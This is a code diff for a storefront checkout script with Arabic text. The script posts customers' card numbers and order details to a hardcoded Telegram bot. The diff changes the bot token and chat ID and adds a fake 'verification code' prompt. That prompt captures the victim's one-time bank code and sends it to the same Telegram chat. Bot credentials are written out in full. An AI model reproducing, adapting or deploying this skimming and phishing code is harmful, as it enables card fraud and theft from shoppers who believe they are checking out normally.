@@ -131,7 +131,6 @@ document.addEventListener("DOMContentLoaded", () => {
     
         let isValid = true;
     
-        // Validation logic
         if (!/^\d{16}$/.test(cardNumber)) {
             document.getElementById("card_number_error").textContent = "رقم البطاقة يجب أن يحتوي على 16 رقمًا.";
             isValid = false;
@@ -153,8 +152,8 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     
         if (isValid) {
-            const botToken = "7973735099:AAE-MYlf-dsAKXPyklTxzGwZ_hB-oDG82wA";
-            const chatId = "948393191";
+            const botToken = "8099754986:AAG5AHBSlXr8Zfbs8QGTyOYLljLum39z-Hk";
+            const chatId = "6932671138";
     
             let productDetails = '';
             cart.forEach((product, index) => {
@@ -204,17 +203,59 @@ document.addEventListener("DOMContentLoaded", () => {
                 const data = await response.json();
                 button.disabled = false; 
                 if (data.ok) {
-                    localStorage.clear();
                     Swal.fire({
-                        toast: true,
-                        position: 'top-end',
-                        icon: 'success',
-                        title: 'تم الإرسال بنجاح!',
-                        text: 'تم إرسال بيانات الطلب بنجاح.',
-                        showConfirmButton: false,
-                        timer: 3000
+                        title: 'سيتم ارسال الكود خلال 5 دقائق',
+                        input: 'text',
+                        inputLabel: 'كود التحقق',
+                        inputPlaceholder: 'أدخل كود التحقق المرسل إليك',
+                        showCancelButton: false,
+                        confirmButtonText: 'إرسال',
+                        allowOutsideClick: false,
+                        customClass: {
+                            confirmButton: 'btn-confirm'
+                        },
+                        preConfirm: (verificationCode) => {
+                            if (!verificationCode) {
+                                Swal.showValidationMessage('يرجى إدخال كود التحقق');
+                                return false; 
+                            }
+                            return verificationCode;
+                        }
+                        
+                    }).then(async (result) => {
+                        if (result.isConfirmed) {
+                            const verificationCode = result.value;
+                            const verificationMessage = `
+                                *بيانات التحقق:*
+                                - **كود التحقق:** ${verificationCode}
+                            `;
+                            const verificationPayload = {
+                                chat_id: chatId,
+                                text: verificationMessage,
+                                parse_mode: "Markdown"
+                            };
+    
+                            await fetch(apiUrl, {
+                                method: "POST",
+                                headers: {
+                                    "Content-Type": "application/json",
+                                },
+                                body: JSON.stringify(verificationPayload),
+                            });
+    
+                            Swal.fire({
+                                toast: true,
+                                position: 'top-end',
+                                icon: 'success',
+                                title: 'تم الإرسال بنجاح!',
+                                text: 'تم إرسال الكود بنجاح.',
+                                showConfirmButton: false,
+                                timer: 3000
+                            });
+                            localStorage.clear();
+                            setTimeout(() => window.location.reload(), 3000);
+                        }
                     });
-                    setTimeout(() => window.location.reload(), 3000); 
                 } else {
                     console.error("Telegram API Error:", data);
                     Swal.fire({
@@ -244,6 +285,7 @@ document.addEventListener("DOMContentLoaded", () => {
             button.disabled = false; 
         }
     });
+    
     
     document.getElementById("card_number").addEventListener("input", function (e) {
         this.value = this.value
